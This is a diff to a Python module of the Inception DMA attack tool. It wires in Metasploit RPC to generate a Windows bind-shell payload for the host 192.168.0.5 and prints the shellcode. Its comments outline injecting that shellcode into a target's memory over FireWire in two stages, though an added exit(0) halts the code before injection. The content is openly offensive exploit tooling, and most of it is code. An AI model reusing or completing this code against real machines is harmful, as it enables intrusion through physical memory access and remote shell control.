@@ -23,14 +23,56 @@ Created on Dec 5, 2013
 '''
 from inception import firewire, cfg, term, util
 from inception.screenlock import list_targets, select_target, searchanddestroy, patch
+from inception.raw import InceptionTarget
+from inception.external.pymetasploit.metasploit.msfrpc import MsfRpcClient, MsfRpcError, PayloadModule
+from inception.external.pymetasploit.metasploit.msfconsole import MsfRpcConsole
+
 import time
 import os
 
 info = '''A description of the module goes here.'''
 
+class Target(InceptionTarget):
+    pass
+
 def run():
 
-    # Start msf and generate shellcode(s) (in a separate thread?)
+    # Connect to msf and generate shellcode(s)
+    try:
+        client = MsfRpcClient('abc123')
+    except MsfRpcError as e:
+        term.fail(e)
+
+    term.poll('What payload module would you like to infect the host with?')
+    name = 'windows/shell/bind_tcp' #input()
+    try:
+        module = PayloadModule(client, name)
+    except MsfRpcError as e:
+        term.fail(e)
+
+    
+    # term.poll('Options:')
+    # options = {'LHOST': 'localhost'}
+    module['RHOST'] = '192.168.0.5'
+    # module['ForceEncode'] = False
+    # module['-t'] = 'raw'
+    opts = {'ForceEncode': False}
+    try:
+        payload = module.execute(Encoder='generic/none').get('payload') # **{'-t': 'raw'}
+    except MsfRpcError as e:
+        term.fail(e)
+
+    for o in module.options:
+        print('{0}: {1}'.format(o, module[o]))
+    print('---')
+    for o in module.advanced:
+        print('{0}: {1}'.format(o, module[o]))
+    print('---')
+    for o in module.runoptions:
+        print('{0}: {1}'.format(o, module[o]))
+    print('---')
+    print(payload)
+    print(util.bytes2hexstr(payload))
 
     # Search for signature
 
@@ -45,7 +87,7 @@ def run():
     # Restore the original memory content where stage 1 was written (overwrite it)
 
     # Patch with stage 2 - forks / creates and executes a new thread with prepended shellcode
-
+    exit(0)
     # Initialize and lower DMA shield
     if not cfg.filemode:
         try:
